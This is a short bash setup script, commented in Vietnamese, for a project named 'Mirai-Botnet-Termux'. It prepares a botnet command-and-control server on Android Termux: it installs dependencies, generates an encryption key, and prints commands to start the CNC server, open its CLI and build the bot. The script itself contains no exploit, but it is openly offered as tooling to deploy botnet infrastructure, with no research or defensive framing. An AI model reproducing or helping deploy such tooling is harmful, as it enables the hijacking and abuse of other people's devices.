#!/bin/bash
# setup.sh — Cài đặt dependencies cho CNC server
# Dành cho Termux trên Android

set -e

echo "=== Mirai-Botnet-Termux Setup ==="

# Kiểm tra Python
if ! command -v python3 &>/dev/null; then
    echo "[-] Python3 not found. Install: pkg install python"
    exit 1
fi
echo "[+] Python: $(python3 --version)"

# Cài Python packages
echo "[*] Installing Python dependencies..."
pip install -r requirements.txt

# Kiểm tra compiler cho bot
if command -v clang++ &>/dev/null; then
    echo "[+] C++ compiler: $(clang++ --version | head -1)"
else
    echo "[!] clang++ not found. Bot build will be skipped."
    echo "    Install: pkg install clang make"
fi

# Tạo thư mục
mkdir -p dist/modules

# Tạo config nếu chưa có
if [ ! -f config.yaml ]; then
    echo "[*] Creating config.yaml from example..."
    cp config.example.yaml config.yaml
    # Sinh key ngẫu nhiên
    NEW_KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
    sed -i "s/0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef/$NEW_KEY/" config.yaml
    echo "[+] Random encryption key generated"
fi

echo ""
echo "=== Setup complete ==="
echo "Start CNC server:  python -m server.server --config config.yaml"
echo "Open CLI:          python -m server.cli"
echo "Build bot:         cd bot && make"
